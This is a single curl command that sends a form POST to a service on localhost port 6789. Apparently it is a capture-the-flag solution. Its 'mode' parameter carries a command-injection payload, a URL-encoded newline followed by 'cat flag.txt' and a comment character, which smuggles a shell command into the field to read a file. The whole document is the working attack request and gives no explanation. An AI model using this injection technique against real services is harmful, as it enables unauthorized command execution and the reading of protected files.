curl 'http://localhost:6789/' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'mode=-d%0acat flag.txt #&message=foo' \
  --compressed
